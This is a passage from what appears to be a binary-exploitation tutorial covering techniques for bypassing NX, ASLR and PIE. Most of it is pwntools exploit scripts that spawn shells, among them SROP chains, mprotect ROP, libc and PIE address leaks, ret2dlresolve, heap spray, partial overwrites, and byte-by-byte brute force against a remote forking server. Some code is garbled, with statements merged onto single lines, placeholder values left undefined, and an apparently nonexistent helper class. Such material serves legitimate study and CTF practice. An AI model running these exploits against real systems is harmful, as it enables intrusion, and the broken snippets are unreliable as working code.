frame.rax = 59  # sys_execve
frame.rdi = 0x601000  # "/bin/sh" address (must write there first)
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret  # Jump to syscall to execute execve

payload = b"A" * offset
payload += p64(syscall_ret)  # First syscall: sigreturn (rax must be 15)
payload += bytes(frame)

p = process(binary)
p.sendline(payload)
p.interactive()
```

**Setting RAX for SROP:**

```python
# Method 1: Use read() syscall
# read() returns number of bytes read in RAX
# Send exactly 15 bytes to set RAX=15

# Method 2: Use gadget
pop_rax_ret = 0x401234 payload += p64(pop_rax_ret) payload += p64(15) # sys_rt_sigreturn payload += p64(syscall_ret) payload += bytes(frame)
````

**Complete SROP Example:**
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

binary = './srop_example'
elf = ELF(binary)

p = process(binary)

# Gadgets
syscall_ret = 0x401234  # syscall; ret
writable_addr = 0x601000  # .bss or .data

offset = 120

# Stage 1: Write "/bin/sh" to writable memory
# Use read() syscall: read(0, writable_addr, 8)
frame1 = SigreturnFrame()
frame1.rax = 0  # sys_read
frame1.rdi = 0  # stdin
frame1.rsi = writable_addr
frame1.rdx = 8
frame1.rip = syscall_ret
frame1.rsp = writable_addr + 0x100  # New stack location

payload = b"A" * offset
payload += p64(syscall_ret)  # sigreturn (need rax=15 first)
payload += bytes(frame1)

# Set RAX to 15 using read() trick
p.send(b"X" * 15)  # read() returns 15 in RAX
p.sendline(payload)

# Send "/bin/sh\x00"
sleep(0.1)
p.send(b"/bin/sh\x00")

# Stage 2: execve("/bin/sh", 0, 0)
frame2 = SigreturnFrame()
frame2.rax = 59  # sys_execve
frame2.rdi = writable_addr  # "/bin/sh"
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret

payload2 = p64(syscall_ret)
payload2 += bytes(frame2)

p.send(b"X" * 15)  # Set RAX=15 again
p.sendline(payload2)

p.interactive()
````

### NX Bypass in Specific Scenarios

**Scenario 1: Executable Stack Region (Partial NX)**

```bash
# Some regions may be executable even with NX
# Check with: cat /proc/$PID/maps

# Look for rwxp regions:
# - VDSO (virtual dynamic shared object)
# - JIT compiler regions
# - Explicitly mapped executable regions

# Exploit: Write shellcode to executable region, jump there
```

**Scenario 2: mprotect() to Make Stack Executable**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './mprotect_rop'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ROP chain to call mprotect(stack_addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)
# Then return to shellcode on stack

pop_rdi = 0x401234
pop_rsi = 0x401236
pop_rdx = 0x401238

mprotect = libc.symbols['mprotect']
stack_addr = 0x7ffffffde000  # Page-aligned stack address
PROT_RWX = 7  # PROT_READ | PROT_WRITE | PROT_EXEC

shellcode_addr = stack_addr + 0x500  # Shellcode location on stack

offset = 120

payload = b"A" * offset

# Call mprotect(stack_addr, 0x1000, 7)
payload += p64(pop_rdi)
payload += p64(stack_addr)

payload += p64(pop_rsi)
payload += p64(0x1000)

payload += p64(pop_rdx)
payload += p64(PROT_RWX)

payload += p64(mprotect)

# Jump to shellcode
payload += p64(shellcode_addr)

# Shellcode (will be on stack)
payload += asm(shellcraft.sh())

p = process(binary)
p.sendline(payload)
p.interactive()
```

**Scenario 3: JIT Spray (Browser/JavaScript Context)**

```python
# In browsers with JIT compilation:
# 1. Craft JavaScript to generate specific byte patterns
# 2. JIT compiler creates executable code with our patterns
# 3. Jump to JIT region and execute embedded shellcode

# Not directly applicable to typical CTF binaries
```

### NX Detection and Configuration

**Compilation Flags:**

```bash
# Enable NX (default on modern GCC)
gcc -z noexecstack source.c -o binary

# Disable NX (make stack executable)
gcc -z execstack source.c -o binary

# Check current default
gcc -v 2>&1 | grep -- --enable-default-pie
```

**Kernel Configuration:**

```bash
# Check kernel NX support
cat /proc/cpuinfo | grep -i nx

# Disable NX at boot (kernel parameter)
# Add to boot parameters: noexec=off

# Check current setting
cat /proc/sys/kernel/exec-shield  # Older kernels
```

## Address Space Layout Randomization (ASLR)

### Mechanism Overview

**Concept:** Randomize memory addresses of stack, heap, libraries, and (with PIE) executable each time program runs.

**Randomized Regions:**

```
Without ASLR:                    With ASLR:
Stack:      0xbffff000           0xbf8a1000 (random)
Heap:       0x0804a000           0x09a4e000 (random)
Libraries:  0xb7e00000           0xb7621000 (random)
Executable: 0x08048000 (fixed)   0x08048000 (still fixed without PIE)

With ASLR + PIE:
Executable: 0x555555554000 (random)
```

**ASLR Levels (Linux):**

```bash
cat /proc/sys/kernel/randomize_va_space

# 0 = Disabled (no randomization)
# 1 = Conservative (randomize stack, heap, mmap, VDSO)
# 2 = Full (also randomize data segments) - DEFAULT
```

**Entropy:**

```
32-bit Linux:
- Stack:     ~19 bits (524,288 possibilities)
- Libraries: ~16 bits (65,536 possibilities)
- Heap:      ~13 bits (8,192 possibilities)

64-bit Linux:
- Stack:     ~30 bits (1,073,741,824 possibilities)
- Libraries: ~28 bits (268,435,456 possibilities)
- Heap:      ~28 bits
- PIE:       ~28 bits (only lower bits randomized)
```

### Detection Methods

**System-Level Check:**

```bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space

# Check for specific process
cat /proc/$PID/maps
# Run multiple times and compare addresses

# Disable ASLR (requires root)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Enable full ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# Disable for single execution
setarch $(uname -m) -R ./binary
# or
setarch x86_64 -R ./binary
```

**Testing ASLR:**

```bash
# Run binary multiple times, check addresses
for i in {1..5}; do ./binary & done
cat /proc/*/maps | grep stack

# Or with script
for i in {1..10}; do
    gdb -batch -ex "break main" -ex "run" -ex "info proc mappings" ./binary 2>&1 | grep heap
done
```

**Checking in GDB:**

```bash
gdb ./binary

# Disable ASLR in GDB (for debugging)
set disable-randomization on
run

# Enable ASLR in GDB
set disable-randomization off
run

# Check current setting
show disable-randomization
```

### Bypass Techniques

#### Bypass Method 1: Information Leak

**Leaking Stack Address:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('./aslr_binary')

# Format string to leak stack address
p.sendline(b"%p")
leaked_addr = int(p.recvline().strip(), 16)

log.success(f"Leaked stack address: {hex(leaked_addr)}")

# Calculate offset to return address
# If leaked address is at known offset from target
target_offset = 0x100  # Example
target_addr = leaked_addr + target_offset

log.info(f"Target address: {hex(target_addr)}")

# Use in exploit
p.interactive()
```

**Leaking Libc Address:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './leak_libc'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Method 1: Format string on GOT entry
puts_got = elf.got['puts']

payload = p64(puts_got)
payload += b"%6$s"

p.sendline(payload)
p.recvuntil(b"s")

leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']

log.success(f"Libc base: {hex(libc_base)}")

# Calculate other addresses
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(bin_sh)}")

p.interactive()
```

**Leaking via puts/printf:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './puts_leak'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# ROP to call puts(puts@GOT)
pop_rdi = 0x401234  # Assuming known from binary (not randomized without PIE)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

offset = 120

# Stage 1: Leak libc
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)  # Return to main

p.sendline(payload)
p.recvuntil(b"A" * offset)

leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']

log.success(f"Libc base: {hex(libc_base)}")

# Stage 2: Exploit with known addresses
# ... continue exploitation ...

p.interactive()
```

**Leaking Heap Address:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./heap_leak')

# Many heap implementations store metadata with addresses
# Allocated chunks may contain forward/backward pointers

# Request allocation
p.sendline(b"malloc 100")

# Trigger heap info leak (via UAF, format string, etc.)
p.sendline(b"show 0")  # Assuming show command exists

heap_leak = p.recvline()
heap_addr = int(heap_leak.strip(), 16)

log.success(f"Heap address: {hex(heap_addr)}")

p.interactive()
```

#### Bypass Method 2: Brute Force

**32-bit Brute Force (Feasible):**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

# Target: Guess correct library address
# With ~16 bits entropy, ~65,536 attempts average

def try_exploit(guess_addr):
    """Try exploitation with guessed address"""
    try:
        p = process('./binary32', timeout=1)
        
        payload = b"A" * 112
        payload += p32(guess_addr)  # Guessed system() address
        payload += p32(0xdeadbeef)
        payload += p32(0xbffff000)  # Guessed /bin/sh location
        
        p.sendline(payload)
        p.sendline(b"echo pwned")
        
        response = p.recvall(timeout=1)
        p.close()
        
        return b"pwned" in response
    except:
        return False

# Brute force with educated guesses
# Libraries typically loaded in specific range
base_guess = 0xb7e00000

for offset in range(0, 0x100000, 0x1000):  # Page-aligned
    guess = base_guess + offset
    
    if try_exploit(guess):
        log.success(f"Found correct address: {hex(guess)}")
        break
    
    if offset % 0x10000 == 0:
        log.info(f"Tried {offset // 0x1000} pages...")
```

**64-bit Partial Overwrite:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

# With PIE, only lower 12 bits are fixed (page offset)
# Overwrite only lower 2-3 bytes to stay within same binary
# Success rate: 1/16 (4 bits) to 1/256 (8 bits)

def try_partial_overwrite():
    """Try exploitation with partial overwrite"""
    try:
        p = process('./pie_binary', timeout=1)
        
        # Overwrite only lower 2 bytes to reach win function
        # win() at offset 0x1234 in binary
        
        payload = b"A" * 120
        payload += p16(0x1234)  # Partial overwrite (lower 2 bytes)
        
        p.sendline(payload)
        p.sendline(b"echo pwned")
        
        response = p.recvall(timeout=1)
        p.close()
        
        return b"pwned" in response
    except:
        return False

# Try multiple times (1/16 success rate)
for attempt in range(100):
    if try_partial_overwrite():
        log.success(f"Success on attempt {attempt + 1}")
        break
    
    if attempt % 10 == 0:
        log.info(f"Attempt {attempt}...")
```

**Brute Force with Forking Server:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

# Forking server keeps same addresses across connections
# Can brute force byte-by-byte

def brute_byte(known_bytes, position):
    """Brute force single byte at position"""
    for byte_val in range(256):
        try:
            p = remote('target', 1337, timeout=1)
            
            test_addr = known_bytes + bytes([byte_val])
            
            payload = b"A" * 120
            payload += test_addr
            payload += b"B" * (8 - len(test_addr))
            
            p.sendline(payload)
            response = p.recvall(timeout=1)
            p.close()
            
            # If no crash, byte might be correct
            if b"segmentation" not in response:
                return byte_val
        except:
            continue
    
    return None

# Brute force address byte-by-byte
known = b""
for i in range(8):
    byte = brute_byte(known, i)
    if byte is not None:
        known += bytes([byte])
        log.info(f"Found byte {i}: {hex(byte)}")
    else:
        log.error(f"Failed at byte {i}")
        break

log.success(f"Full address: {known.hex()}")
```

#### Bypass Method 3: Partial Overwrite

**Overwriting Function Pointer (Same Binary):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# If function pointer exists on heap/stack
# And target function is in same binary (PIE)
# Only need to change lower bytes (offset within binary)

p = process('./partial_overwrite')

# win() function at offset 0x1234 in binary
# Current pointer points to offset 0x5678
# Only overwrite lower 2 bytes

payload = b"A" * 56  # Reach function pointer
payload += p16(0x1234)  # Overwrite lower 2 bytes

# Success rate: 1/16 (4 bits of address still randomized in page)

p.sendline(payload)
p.interactive()
```

**Partial Overwrite of Return Address:**

```python
#!/usr/bin/env python3
from pwn import *

# Overwrite only necessary bytes of return address
# Works when target is close to original return address

def attempt_exploit():
    p = process('./partial_ret')
    
    # Original return address: 0x555555554abc
    # Target address (win):    0x555555554def
    # Difference: 0x333 (only lower 2 bytes different)
    
    payload = b"A" * 120
    payload += b"\xef\x4d"  # Overwrite lower 2 bytes
    # Leave upper 6 bytes unchanged
    
    p.sendline(payload)
    
    try:
        p.sendline(b"cat flag.txt")
        flag = p.recvline()
        p.close()
        return flag
    except:
        p.close()
        return None

# Try multiple times due to 4-bit randomness
for i in range(16):
    result = attempt_exploit()
    if result:
        log.success(f"Flag: {result.decode()}")
        break
```

#### Bypass Method 4: ret2dlresolve

**Concept:** Abuse dynamic linker to resolve arbitrary symbols without knowing libc addresses.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './ret2dlresolve_binary'
elf = context.binary

p = process(elf.path)

# Use pwntools ret2dlresolve helper
rop = ROP(elf)

# Resolve and call system("/bin/sh")
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.raw(b"A" * 120)
rop.ret2dlresolve(dlresolve)

payload = rop.chain()

p.sendline(payload)
p.interactive()
```

**Manual ret2dlresolve (32-bit):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

binary = './ret2dlresolve32'
elf = ELF(binary)

# Find necessary gadgets and addresses
plt_0 = 0x8048300  # First PLT entry (_dl_runtime_resolve)
bss = elf.bss()

# Build fake relocation entry and symbol
# This is complex - use pwntools helper or detailed tutorial

# Simplified: Use pwntools
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.raw(b"A" * 112)
rop.ret2dlresolve(dlresolve)

p = process(binary)
p.sendline(rop.chain())
p.interactive()
```

#### Bypass Method 5: Heap Spray

**Concept:** Allocate many objects at predictable addresses, increasing chance of successful guess.

```python
#!/usr/bin/env python3
from pwn import *

p = process('./heap_spray')

# Spray heap with shellcode at many locations
shellcode = asm(shellcraft.sh())

# Allocate many chunks containing shellcode
for i in range(1000):
    p.sendline(b"alloc 256")
    p.sendline(shellcode.ljust(256, b"\x90"))

# Now guess heap address (higher success rate)
# Heap typically starts around 0x555555559000 on 64-bit

guess_addr = 0x555555559000

payload = b"A" * 120
payload += p64(guess_addr)

p.sendline(payload)
p.interactive()
```

### ASLR in Different Contexts

**32-bit vs 64-bit:**

```
32-bit:
- Limited address space (4GB)
- Lower entropy (~16-19 bits)
- Brute force feasible
- Partial overwrites more effective

64-bit:
- Large address space (128TB user space)
- Higher entropy (~28-30 bits)
- Brute force impractical
- Requires information leak
- Partial overwrites still useful within binary
```

**ASLR + PIE:**

```python
# Without PIE:
# - Executable at fixed address
# - ROP gadgets at known addresses
# - Can build ROP chain to leak and exploit

# With PIE:
# - Everything randomized
# - Need leak for any code addresses
# - Or use partial overwrite within binary
```

**ASLR on Different Systems:**

```
Linux (modern):
- Full ASLR with PIE
- 28-bit entropy (64-bit)

Windows (ASLR/DEP):
- Similar to Linux
- Per-boot randomization (not per-process on some versions)

Android:
- PIE mandatory since Android 5.0
- Similar entropy to Linux

iOS:
- ASLR always enabled
- No way to disable

macOS:
- Similar to Linux
- ASLR enabled by default
```

### ASLR Configuration

**Temporary Disable:**

```bash
# Disable ASLR for current session
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Run single binary without ASLR
setarch $(uname -m) -R ./binary

# In GDB
gdb ./binary
set disable-randomization on
run
```

**Permanent Disable (not recommended):**

```bash
# Edit /etc/sysctl.conf
sudo nano /etc/sysctl.conf

# Add line:
kernel.randomize_va_space = 0

# Apply
sudo sysctl -p
```

**Testing ASLR Entropy:**

```python
#!/usr/bin/env python3
import subprocess
import re

addresses = set()

for i in range(100):
    # Run binary and extract address
    output = subprocess.check_output(['sh', '-c', './binary 2>&1'])
    
    # Parse address from output
    match = re.search(rb'0x[0-9a-f]+', output)
    if match:
        addresses.add(match.group())

print(f"Unique addresses in 100 runs: {len(addresses)}")
print(f"Entropy: ~{len(addresses).bit_length()} bits")
```

## Position Independent Executables (PIE)

### Mechanism Overview

**Concept:** Compile executable as shared library, allowing it to be loaded at any address. Combined with ASLR for full address randomization.

**Memory Layout:**

```
Without PIE:
Text: 0x0040000 (fixed)
Data: 0x00601000 (fixed)
GOT:  0x00601020 (fixed)

With PIE:
Text: 0x555555554000 (random)
Data: 0x555555755000 (random)
GOT:  0x555555755020 (random)
```

**PIE Characteristics:**

- Compiled as position-independent code
- Uses PC-relative addressing
- GOT (Global Offset Table) for external functions
- Base address randomized per execution
- Only lower ~28 bits randomized (64-bit)

### Detection Methods

**Static Analysis:**

```bash
# Using checksec
checksec --file=./binary
# Output: PIE: PIE enabled / No PIE

# Using readelf
readelf -h ./binary | grep Type
# Type: DYN (Shared object file) = PIE enabled
# Type: EXEC (Executable file) = PIE disabled

# Check for position-independent code
readelf -d ./binary | grep TEXTREL
# No TEXTREL = Position independent

# Using file command
file ./binary
# PIE: "dynamically linked" or "shared object"
# No PIE: "statically linked" or specific "executable"
```

**Dynamic Analysis:**

```bash
# Run multiple times and compare base addresses
for i in {1..5}; do
    gdb -batch -ex "break main" -ex "run" -ex "info proc mappings" ./binary 2>&1 | grep -m1 "r-xp"
done

# If addresses change: PIE enabled
# If addresses same: PIE disabled
```

**Checking Base Address:**

```python
#!/usr/bin/env python3
from pwn import *

def get_base():
    p = process('./pie_binary')
    gdb.attach(p, 'break main\ncontinue\n')
    
    # Extract base from /proc/pid/maps
    with open(f'/proc/{p.pid}/maps') as f:
        for line in f:
            if 'r-xp' in line and 'pie_binary' in line:
                base = int(line.split('-')[0], 16)
                return base
    
    p.close()

# Check multiple times
bases = [get_base() for _ in range(5)]
print(f"Base addresses: {[hex(b) for b in bases]}")
print(f"Randomized: {len(set(bases)) > 1}")
```

### Bypass Techniques

#### Bypass Method 1: Information Leak (Code Address)

**Leaking PIE Base via Format String:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_format'
elf = ELF(binary)

p = process(binary)

# Find code pointer on stack (saved RIP or function pointer)
# Typically at specific offset

for i in range(1, 30):
    test = process(binary, level='error')
    test.sendline(f"%{i}$p".encode())
    resp = test.recvline().decode().strip()
    test.close()
    
    # Code addresses start with 0x55 or 0x56 (64-bit PIE)
    if resp.startswith('0x55') or resp.startswith('0x56'):
        log.info(f"Code pointer at offset {i}: {resp}")

# Assume code pointer at offset 15
p.sendline(b"%15$p")
leaked_addr = int(p.recvline().strip(), 16)

# Calculate PIE base
# If leaked main+XX, subtract offset
pie_base = leaked_addr - elf.symbols['main'] - XX  # Adjust XX based on leak

log.success(f"PIE base: {hex(pie_base)}")

# Calculate other addresses
win_addr = pie_base + elf.symbols['win']
log.info(f"win @ {hex(win_addr)}")

p.interactive()
```

**Leaking via Return Address:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_leak'
elf = ELF(binary)

p = process(binary)

# If binary has stack read vulnerability
p.sendline(b"read_stack")

leaked_data = p.recv(200)

# Find return address in leaked data
# Return address points to code section

# Parse for code address (starts with 0x55/0x56)
for i in range(0, len(leaked_data) - 8, 8):
    addr = u64(leaked_data[i:i+8])
    
    if 0x555555554000 <= addr <= 0x555555556000:  # Typical PIE range
        log.info(f"Potential code address: {hex(addr)}")
        
        # Calculate base (assuming known offset)
        # Need to identify which function leaked address belongs to
        pie_base = (addr >> 12) << 12  # Rough estimate (page-aligned)
        log.success(f"PIE base (estimate): {hex(pie_base)}")
        break

p.interactive()
```

**Leaking via Buffer Overflow (Partial Read):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('./pie_overflow')

# Overflow buffer to leak adjacent data (including saved RIP)
payload = b"A" * 100  # Overflow to reach saved RIP

p.sendline(payload)

# If binary prints buffer or adjacent data
leaked = p.recvline()

# Extract address from leaked data
# Look for bytes matching code address pattern

# Parse and calculate PIE base
# ...

p.interactive()
```

#### Bypass Method 2: Partial Overwrite

**Overwriting Lower Bytes Only:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_partial'
elf = ELF(binary)

# PIE base randomized, but lower 12 bits (page offset) are fixed
# win() at offset 0x1234 in binary
# main() at offset 0x1100 in binary

# Overwrite only lower 2 bytes of return address
# to change from main's return to win()

def attempt():
    p = process(binary)
    
    payload = b"A" * 120
    payload += p16(0x1234)  # Overwrite lower 2 bytes
    # Upper 6 bytes remain pointing to binary
    
    p.sendline(payload)
    
    try:
        p.sendline(b"cat flag.txt")
        result = p.recvline()
        p.close()
        return result
    except:
        p.close()
        return None

# Success rate: 1/16 (4 bits randomized in page offset)
for i in range(20):
    result = attempt()
    if result and b"flag" in result:
        log.success(f"Flag: {result.decode()}")
        break
    log.info(f"Attempt {i+1} failed")
```

**Partial Overwrite with Alignment:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Some targets may be on specific page boundaries
# Reducing randomness further

# Example: .text section always at base + 0x1000
# Functions within .text have fixed relative positions

# Only need to guess base page (12 bits fixed, 16 bits to guess)
# vs full address (28 bits to guess)

p = process('./pie_aligned')

# Overwrite to point to specific page offset
payload = b"A" * 120
payload += p16(0x1234)  # Function offset
payload += b"\x55\x55"  # Guess middle bytes (reduce space)

p.sendline(payload)
p.interactive()
```

#### Bypass Method 3: Return-to-PLT

**Concept:** PLT entries are at known offsets from PIE base. If we leak any code address, we can calculate PLT.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_plt'
elf = ELF(binary)

p = process(binary)

# Leak code address (any function in binary)
# ... leak code here ...
leaked_code = 0x555555554abc

# Calculate PIE base
pie_base = leaked_code - (leaked_code & 0xfff) # Rough calculation

# Better: pie_base = leaked_code - elf.symbols['function_name']

log.success(f"PIE base: {hex(pie_base)}")

# Calculate PLT addresses

puts_plt = pie_base + elf.plt['puts'] printf_plt = pie_base + elf.plt['printf'] main = pie_base + elf.symbols['main']

# If we don't have GOT leak yet, use PLT to leak GOT

pop_rdi = pie_base + 0x1234 # Find gadget offset in binary

puts_got = pie_base + elf.got['puts']

offset = 120

# Stage 1: Leak libc via PLT

payload = b"A" * offset payload += p64(pop_rdi) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main) # Return to main

p.sendline(payload) p.recvuntil(b"A" * offset)

leaked_puts = u64(p.recv(6).ljust(8, b'\x00')) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_base = leaked_puts - libc.symbols['puts']

log.success(f"Libc base: {hex(libc_base)}")

# Stage 2: Exploit with known addresses

system = libc_base + libc.symbols['system'] bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b"A" * offset payload2 += p64(pop_rdi) payload2 += p64(bin_sh) payload2 += p64(system)

p.sendline(payload2) p.interactive()
````

#### Bypass Method 4: Brute Force (Limited Cases)

**Brute Force Page Offset (4 bits):**
```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

binary = './pie_brute'
elf = ELF(binary)

# Only 4 bits randomized in page offset (16 possibilities)
# Can brute force if we only change within page

def try_offset(offset_guess):
    try:
        p = process(binary, timeout=1)
        
        # Target is at base + offset
        # We overwrite lower 2 bytes only
        # 12 bits fixed (page), 4 bits random
        
        payload = b"A" * 120
        payload += p16(offset_guess)
        
        p.sendline(payload)
        p.sendline(b"echo success")
        
        response = p.recvall(timeout=1)
        p.close()
        
        return b"success" in response
    except:
        return False

# Try all 16 possibilities for the randomized 4 bits
win_offset = 0x1234

for i in range(16):
    # Modify the randomized 4 bits (bits 12-15)
    test_offset = (win_offset & 0x0fff) | (i << 12)
    
    if try_offset(test_offset):
        log.success(f"Success with offset: {hex(test_offset)}")
        break
````

**Brute Force with Forking Server:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

# Forking server maintains same PIE base
# Can brute force address byte-by-byte

def brute_byte_pie(known_bytes, position):
    """Brute force single byte of PIE address"""
    for byte_val in range(256):
        try:
            p = remote('target', 1337, timeout=1)
            
            test_addr = known_bytes + bytes([byte_val])
            test_addr += b"\x00" * (8 - len(test_addr))
            
            payload = b"A" * 120
            payload += test_addr
            
            p.sendline(payload)
            response = p.recvall(timeout=1)
            p.close()
            
            # No crash = possibly correct byte
            if b"flag" in response or b"success" in response:
                return byte_val
        except:
            continue
    
    return None

# Brute force address (typically starts with 0x55 or 0x56)
known = b"\x00\x00\x55"  # Start with typical PIE prefix

for i in range(3, 8):
    byte = brute_byte_pie(known, i)
    if byte is not None:
        known += bytes([byte])
        log.info(f"Found byte {i}: {hex(byte)}")
    else:
        log.error(f"Failed at byte {i}")
        break

log.success(f"Address: {known.hex()}")
```

#### Bypass Method 5: Use GOT Overwrite (After Leak)

**Concept:** Once PIE base is leaked, calculate GOT addresses and overwrite for control.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_got'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Stage 1: Leak PIE base
# (using format string or other method)
p.sendline(b"%3$p")  # Leak code address
leaked = int(p.recvline().strip(), 16)
pie_base = leaked - 0x1234  # Adjust based on what was leaked

log.success(f"PIE base: {hex(pie_base)}")

# Stage 2: Leak libc
puts_got = pie_base + elf.got['puts']

payload = p64(puts_got)
payload += b"%6$s"

p.sendline(payload)
p.recvuntil(b"s")

leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']

log.success(f"Libc base: {hex(libc_base)}")

# Stage 3: Overwrite GOT with system
atoi_got = pie_base + elf.got['atoi']
system = libc_base + libc.symbols['system']

# Use format string to overwrite
exploit = FormatStringExploit(offset=6, arch='amd64')
exploit.add_write(atoi_got, system, size=8)

p.sendline(exploit.generate_payload())

# Stage 4: Trigger system("/bin/sh")
p.sendline(b"/bin/sh")
p.interactive()
```

### PIE with Other Protections

**PIE + NX:**

```python
# Most common combination
# Strategy:
# 1. Leak PIE base to find gadgets
# 2. Leak libc base
# 3. Build ROP chain with known addresses
```

**PIE + Canary:**

```python
# Need to leak both canary and PIE base
# Often done in single format string exploit

# Example:
payload = b"canary:%7$p pie:%15$p"
# Leak both values at once
```

**PIE + Full RELRO:**

```python
# GOT is read-only, can't overwrite
# Strategy:
# - Target __malloc_hook / __free_hook in libc
# - Use ROP to call functions
# - Overwrite stack return addresses
```

### PIE Exploitation Patterns

**Pattern 1: Double Leak (PIE + Libc):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_double_leak'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Single format string payload to leak both
# Code address for PIE, GOT entry for libc

payload = b"pie:%3$p libc:%7$p"
p.sendline(payload)

response = p.recvline().decode()

# Parse leaks
pie_leak = int(response.split("pie:")[1].split()[0], 16)
libc_leak = int(response.split("libc:")[1].split()[0], 16)

pie_base = pie_leak - 0x1234  # Adjust offset
libc_base = libc_leak - libc.symbols['__libc_start_main'] - 231  # Adjust

log.success(f"PIE base: {hex(pie_base)}")
log.success(f"Libc base: {hex(libc_base)}")

# Now exploit with full address knowledge
# ...

p.interactive()
```

**Pattern 2: Iterative Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# Program has loop or multiple connections

p = process('./pie_loop')

# Round 1: Leak PIE
p.sendline(b"leak_pie")
pie_base = int(p.recvline().strip(), 16)

# Round 2: Leak libc
p.sendline(b"leak_libc")
libc_base = int(p.recvline().strip(), 16)

# Round 3: Exploit
p.sendline(b"exploit")
# Send ROP chain with known addresses
# ...

p.interactive()
```

**Pattern 3: One-Shot with Constraints:**

```python
#!/usr/bin/env python3
from pwn import *

# Single vulnerability, no loops
# Must leak and exploit in one payload

# Strategy: Use format string to:
# 1. Leak addresses
# 2. Write ROP chain to stack
# 3. Overwrite return address

# This requires careful format string construction
# to both read (for leaks) and write (for exploit)
```

### PIE Detection and Compilation

**Compilation Flags:**

```bash
# Enable PIE (default on modern systems)
gcc -fPIE -pie source.c -o binary

# Disable PIE
gcc -no-pie source.c -o binary

# Position-independent code without PIE
gcc -fPIC source.c -o binary

# Check compiler default
gcc -v 2>&1 | grep -- --enable-default-pie
```

**System Defaults:**

```bash
# Check if PIE is default on system
echo 'int main(){}' | gcc -xc - -o test
checksec --file=test

# Ubuntu 17.10+ : PIE enabled by default
# Debian 9+     : PIE enabled by default
# Fedora 23+    : PIE enabled by default
```

**Kernel Support:**

```bash
# PIE requires kernel support for loading at random addresses
# Check with:
cat /proc/sys/vm/mmap_rnd_bits  # Number of randomized bits
cat /proc/sys/vm/mmap_rnd_compat_bits  # For 32-bit compat
```

### Advanced PIE Bypass Techniques

#### Technique 1: GOT Dereferencing

**Concept:** Use GOT entries as indirect references to find other addresses.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './pie_got_deref'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Leak PIE base first
# ... leak code ...
pie_base = 0x555555554000

# Read GOT entry (contains libc address)
puts_got = pie_base + elf.got['puts']

# Use format string to read GOT
payload = p64(puts_got)
payload += b"%6$s"

p.sendline(payload)
p.recvuntil(b"s")

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']

log.success(f"Libc via GOT: {hex(libc_base)}")

# From libc, can find other useful addresses
system = libc_base + libc.symbols['system']
environ_ptr = libc_base + libc.symbols['environ']

# environ points to environment variables on stack
# Can read environ to leak stack address

payload2 = p64(environ_ptr)
payload2 += b"%6$s"

p.sendline(payload2)
p.recvuntil(b"s")

environ_addr = u64(p.recv(6).ljust(8, b'\x00'))
stack_leak = u64(environ_addr)

log.success(f"Stack leak: {hex(stack_leak)}")

p.interactive()
```

#### Technique 2: PLT/GOT Forensics

**Analyzing PLT for Offsets:**

```bash
# Disassemble PLT
